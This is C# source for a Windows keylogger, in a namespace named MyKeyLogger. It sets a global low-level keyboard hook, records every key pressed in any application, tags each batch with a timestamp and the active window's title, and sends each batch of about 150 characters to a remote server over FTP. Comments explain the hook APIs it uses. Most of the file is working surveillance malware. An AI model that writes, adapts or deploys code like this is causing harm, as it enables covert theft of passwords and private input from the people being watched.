
// https://docs.microsoft.com/fr-fr/windows/win32/winmsg/hooks?redirectedfrom=MSDN

using System;
using System.Drawing;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace MyKeyLogger
{
	public partial class TrackKeyboard : Form
	{
		public TrackKeyboard()
		{
			InitializeComponent();
		}
	
		private static string data = DateTime.Now.ToString("dd/MM/yyyy HH:mm : ");
		
		// 
		private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
	
        //  
        private static bool CapsLock = false;
        private static bool LControl = false;
        private static bool LMenu = false;
        private static bool RMenu = false;   
	
		//        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        
        /* 
        The first parameter of SetWindowsHookEx specifies the type of hook procedure to be installed.  
		Here we use WH_KEYBOARD_LL or WH_MOUSE_LL .
		The second parameter is the pointer to the hook procedure. 
		In C# we pass the delegate of the hook callback function to this parameter.
		The third parameter is the handle of the module containing the hook procedure.  
		Therefore, we call the GetModuleHandle to retrieve the current module handle of the C# hook application.
		The fourth parameter specifies the identifier of the thread with which the hook procedure is to be associated.  
		If this parameter is zero, the hook procedure is associated with all existing threads running in the same desktop as the calling thread.
		*/
        // https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-setwindowshookexa?redirectedfrom=MSDN
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hmod, uint dwThreadId);

        // https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
	    // https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);  
	
        private static IntPtr _hookID = IntPtr.Zero;
		private static LowLevelKeyboardProc _proc = HookCallback;
        
		
		// To conclude the hook procedure, we use CallNextHookEx function to pass the hook information to the next hook procedure in the current hook chain.  
        // https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-callnexthookex?redirectedfrom=MSDN
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        
        /*
        When we want to stop the low level mouse or keyboard hook, 
        we can use the UnhookWindowsHookEx function to remove the hook procedure installed.
        The parameter is the hook ID we get from the SetWindowsHookEx function.
        */
        // 
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
        	
        	int myASCIIKey = Marshal.ReadInt32(lParam);
        	// Console.WriteLine((Keys)myASCIIKey);
        	var myKey = Enum.GetName(typeof(Keys), myASCIIKey);
			 //Console.WriteLine(myKey);
        	
			 
			 if (data.Length < 150)
			 {
			 	if (wParam == (IntPtr)WM_KEYDOWN){
				 	data = data + myKey;
				 	Console.WriteLine(data.Length);
				 }
			 }
			 else
			 {
			 	data = data + "\n";
		 		ServerFTP.ConnectionServer(data);
		 		data =  DateTime.Now.ToString("dd/MM/yyyy HH:mm : ") + ActiveWindows.NomDeLaFenetre() + " : ";
			 }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        
        public static void Start()
        {        	
        	var handle = GetConsoleWindow();
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
            OperationKey.TurnOFFCapsLockKey();
        }
	}
	
}
